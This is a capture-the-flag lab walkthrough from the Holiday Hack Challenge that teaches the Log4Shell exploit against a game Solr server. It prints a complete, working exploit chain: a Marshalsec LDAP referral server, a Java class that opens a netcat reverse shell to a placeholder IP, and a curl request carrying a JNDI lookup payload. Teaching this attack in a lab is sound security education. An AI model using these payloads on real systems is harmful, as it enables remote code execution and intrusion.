# Yule Log4Jack Help

Hi, Josh Wright here. I'm the technical director for the Holiday Hack
Challenge. We don't normally break the 4th wall like this, but we think this
Log4j vulnerability calls for special measures to give you the information you
need to assess, identify, and mitigate this vulnerability.

In this challenge, Icky McGoop asks for your help in exploiting a Java Solr
server at http://solrpower.kringlecastle.com:8983. This server is vulnerable to
the Log4shell vulnerability. Your goal is to exploit the server and get a
shell.  Once you have shell access, examine the file in
`/home/solr/kringle.txt`.  Read the message, then run `runtoanswer` and answer
the question to complete the challenge.

> The solrpower.kringlecastle.com server is only accessible inside of the North Pole!

To assist you, we have a web server listening on port 8080, serving files from
the `/home/troll/web` directory. We also have a Netcat listener running on
TCP/4444 for a reverse TCP shell callback. We also included the Marshalsec tool
for LDAP deserialization, as part of the Log4shell vulnerability exploit chain.

> **If you want a hands-on lab walkthrough on exploiting this vulnerability, read on!**








# Exploit Steps

The vulnerable server at http://solrpower.kringlecastle.com:8983 is running
Solr; you can see this by making a request to the web server `/solr/` endpoint,
as shown here:

```
~$ curl http://solrpower.kringlecastle.com:8983/solr/
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html ng-app="solrAdminApp" ng-csp>
<!--
...
</body>
</html>
```

> NOTE: Solr is not the only product vulnerable to the Log4shell vulnerability!

To exploit the vulnerable server, we will launch the Marshelsec Java
deserialization LDAP server. The vulnerable server needs to reach the malicious
LDAP server as part of the Log4shell attach path.

Change to the `marshalsec` directory, as shown here:

```
~$ cd marshalsec
~/marshalsec$ ls
marshalsec-0.0.3-SNAPSHOT-all.jar
```

Start the Marshalsec LDAP server, specifying the listening web server by IP
address on port 8080. In the request, indicate the Java class name
`#YuleLogExploit` which will correspond to the attack code we'll generate
next, as shown here:

```
~/marshalsec$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://WEBSERVERIP:8080/#YuleLogExploit"
Listening on 0.0.0.0:1389
```

> Be sure to replace `WEBSERVERIP` with the IP address of your terminal.

So far the attacking system has started the Marshalsec LDAP server started, the
web server to deliver the malicious Java class, and the shell listener. Next,
we need to create the exploit in Java to run a command on the vulnerable server
and connect back to the attacker system.

Click to switch to the bottom terminal. Change to the web directory by running
`cd web`, as shown here.

```
~$ cd web
~/web$
```

Next, create a file named `YuleLogExploit.java` and add the Java exploit code
shown below. You can use the text editor nano to create the file by running
`nano YuleLogExploit.java`.

```
public class YuleLogExploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc NETCATIP 4444 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
```

This Java program will run the Netcat command and send a shell to the specified
IP address.

> NOTE: Make sure you replace the NETCATIP string with the IP address of your
> Netcat listener in the top-right corner of your terminal.

(If you don't want to type this exploit code you can run `mv .exploit
YuleLogExploit.java`), then edit to replace `NETCATIP` with your terminal IP address.

Next, compile the exploit using the javac compiler, as shown here:

```
~/web$ javac YuleLogExploit.java
~/web$ ls
YuleLogExploit.class  YuleLogExploit.java
```

Next, deliver the Log4shell exploit to gain remote access to Santa's Solr
server by making a cURL request, as shown here.

```
~/web$ curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?foo=$\{jndi:ldap://MARSHALSECIP:1389/YuleLogExploit\}'
{
  "responseHeader":{
    "status":0,
    "QTime":105},
  "initFailures":{},
  "status":{}}
```

> Be sure to replace `MARSHALSECIP` with the IP address of your terminal.

If the exploit succeeds, you will see a status update in the terminal
window for the Marshalsec LDAP server, the web server, and the Netcat shell
listener. Switch to the Netcat shell listener terminal and enter any Linux
command such as `whoami`:

```
listening on [172.17.0.2] 4444 ...
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.2] 49530
whoami
solr
```

**Success!**

Next, retrieve the contents of the file in `/home/solr/kringle.txt` using `cat`:

```
cat /home/solr/kringle.txt
...
```

Finally, return to the terminal where you ran cURL and run `runtoanswer` to
complete the achievement.

## Troubleshooting

If you don't get a shell following these steps there are several ways to
troubleshoot:

1. Verify that the Marshalsec server is started with the terminal IP address
2. Verify that the `YuleLogExploit.java` file has the terminal IP address for
   the reverse TCP connection
3. If you change the Java class exploit, make sure you recompile it by running
   `java YuleLogExploit.java`.
4. Verify that the `curl` request specifies the Marshalsec LDAP server in the
   request pointing to the terminal IP address
